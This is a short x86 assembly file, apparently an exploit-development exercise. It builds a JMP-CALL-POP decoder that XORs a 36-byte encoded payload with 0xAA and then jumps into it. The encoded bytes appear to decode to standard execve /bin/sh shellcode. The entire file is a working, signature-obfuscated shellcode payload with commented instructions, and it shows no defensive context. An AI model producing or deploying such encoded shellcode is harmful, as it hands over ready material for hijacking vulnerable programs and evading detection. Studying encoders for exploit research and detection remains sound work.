global _start

section .data
_start:
    ; jmp-call will actually put the address of the encoded shellcode string in the stack
    jmp short call_decoder

decoder:
    ; Zero-ing of registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    pop esi     ; Puts the address of encoded_shellcode in esi
    mov cl, 36  ; Length of encoded_shellcode

decode:
    xor byte [esi], 0xAA    ; xor-ing a particular byte location with 0xAA to retrieve the original code
    inc esi                 ; Go to the next byte
    loop decode

    jmp short shellcode     ; After decoding is done, jumps to decoded shellcode

call_decoder:
    call decoder

    ; Encoded shellcode
    shellcode: db 0x9b,0x6a,0x9b,0x71,0x9b,0x63,0x9b,0x78,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,0x9b,0x6a,0xea,0x9b,0x71,0x67,0x2a
